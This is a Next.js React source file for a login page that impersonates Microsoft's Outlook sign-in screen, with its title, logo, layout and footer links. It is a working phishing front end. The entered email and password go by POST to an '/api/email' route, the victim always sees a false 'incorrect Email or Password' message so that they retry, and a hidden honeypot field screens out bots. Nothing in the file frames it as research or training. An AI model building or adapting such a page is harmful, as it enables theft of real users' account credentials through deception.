"use client";
import { useState } from "react";
import Head from "next/head";
import axios from 'axios';
import Image from "next/image";

export default function Login() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [honeypot, setHoneypot] = useState(""); // <- Honeypot
  const [step, setStep] = useState(1);
  const [isSubmitting, setIsSubmitting] = useState<any>(null);
  const [error, setError] = useState<any>(null);

  const handleSubmit = async (e: any) => {
    e.preventDefault();

    // 👀 Block if bot
    if (honeypot) {
      console.warn("Bot detected");
      return;
    }

    setIsSubmitting(true);
    const formData = { email, password };

    try {
      const response = await axios.post('/api/email', formData);
      setIsSubmitting(true);

      if (response.status === 200) {
        setEmail("");
        setPassword("");
        setError("incorrect Email or Password");
        setIsSubmitting(false);
      } else {
        throw new Error('___________________');
      }
    } catch (error) {
      console.error('Submission error:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleNext = () => {
    if (email === "") {
      setError("Enter a valid email address, phone number, or Skype name.");
    } else {
      setError("");
      setStep(2);
    }
  };

  return (
    <>
      <Head>
        <title>Sign in to your Microsoft account</title>
      </Head>

      <main className="relative min-h-screen flex-col w-full overflow-hidden items-center px-2 flex md:items-center md:justify-center bg-white">
        <div className="absolute inset-0 hidden md:block bg-[url('/images/loginbg.svg')] bg-no-repeat bg-cover bg-center" />
        <div className="flex-col flex w-full max-w-md">
          <div className="relative z-10 bg-white md:w-[420px] md:p-[10px] md:h-[339px] md:shadow-md w-full mx-4 sm:mx-auto overflow-hidden">
            <div className={`w-[200%] h-full flex transition-transform duration-500 ease-in-out ${step === 1 ? "translate-x-0" : "-translate-x-1/2"}`}>
              
              {/* Email Step */}
              <div className="w-full md:w-1/2 py-4 sm:p-10">
                <img src="/images/icon.png" alt="Microsoft Logo" className="mb-6 w-28 sm:w-24" />
                <div className="text-[#1b1b1b]">
                  <h1 className="text-xl font-semibold">Sign in</h1>
                  <p className="text-xs">to continue to Outlook</p>
                </div>

                <p className="text-sm text-red-500 mt-4">{error}</p>
                <input
                  type="email"
                  placeholder={` Email, phone, or Skype`}
                  className={`w-full border-b border-[#1b1b1b] text-sm py-1 ${error ? "border-red-500" : ""} mb-3 text-[#1b1b1b] focus:outline-none focus:ring-0`}
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                />

                {/* Honeypot (Hidden from users) */}
                <input
                  type="text"
                  name="honeypot"
                  autoComplete="off"
                  value={honeypot}
                  onChange={(e) => setHoneypot(e.target.value)}
                  className="hidden"
                />

                <p className="text-sm text-gray-600 mb-6">
                  No account? <a href="#" className="text-[#0067b8] hover:underline">Create one!</a>
                </p>
                <button
                  onClick={handleNext}
                  className="bg-[#0067b8] absolute w-[108px] h-[32px] right-[54%] md:right-[54%] text-sm md:bottom-10 bottom-3 flex items-center justify-center text-white py-2 transition"
                >
                  Next
                </button>
              </div>

              {/* Password Step */}
              <div className="w-full md:w-1/2 py-4 sm:p-10">
                <img src="/images/icon.png" alt="Microsoft Logo" className="mb-2 w-28 sm:w-36" />
                <button
                  onClick={() => { setStep(1); setError(""); }}
                  className="text-sm flex items-center text-[#1b1b1b] mb-2 hover:underline"
                >
                  <Image src={"/images/arrow.svg"} alt="arrow" width={20} height={20} />
                  {email}
                </button>

                <div>
                  <h1 className="text-xl text-[#1b1b1b] font-semibold mb-3">Enter password</h1>
                  <p className="text-red-500 text-xs">{!isSubmitting && error !== "" ? error : ""}</p>
                </div>
                <input
                  type="password"
                  placeholder="Password"
                  className="w-full border-b-2 border-[#1b1b1b] focus:ring-blue-400 text-sm py-1 mb-3 text-[#1b1b1b] focus:outline-none focus:ring-0"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                <p className="text-sm text-gray-600 mb-6">
                  No account? <a href="#" className="text-[#0067b8] text-xs hover:underline">Forgot password</a>
                </p>
                <button
                  onClick={handleSubmit}
                  className="bg-[#0067b8] absolute w-[108px] h-[32px] text-sm right-4 md:right-4 bottom-3 flex items-center justify-center text-white py-2 transition"
                >
                  Sign in
                </button>
              </div>
            </div>
          </div>

          <div className={`border ${step === 2 ? "hidden" : "block"} z-50 bg-white w-full md:w-[420px] max-w-md px-6 flex items-center py-2 mx-auto mt-10 md:mt-4 h-12`}>
            <button className="flex items-center text-sm text-[#1b1b1b] hover:underline">
              <span className="mr-2">
                <Image alt="key" width={32} height={32} src={"/images/key.svg"} />
              </span>
              Sign-in options
            </button>
          </div>
        </div>

        <footer className="absolute bottom-16 w-full flex flex-wrap items-center justify-center text-xs text-gray-600 gap-3 px-4 sm:gap-6">
          <div className="flex items-center gap-3">
            <a href="#" className="hover:underline">Terms of use</a>
            <a href="#" className="hover:underline">Privacy & cookies</a>
            <span className="sm:inline">• • •</span>
          </div>
          <span className="block sm:hidden w-full text-center mt-1">
            Use private browsing if this is not your device.{" "}
            <a href="#" className="text-blue-600 hover:underline">Learn more</a>
          </span>
        </footer>
      </main>
    </>
  );
}
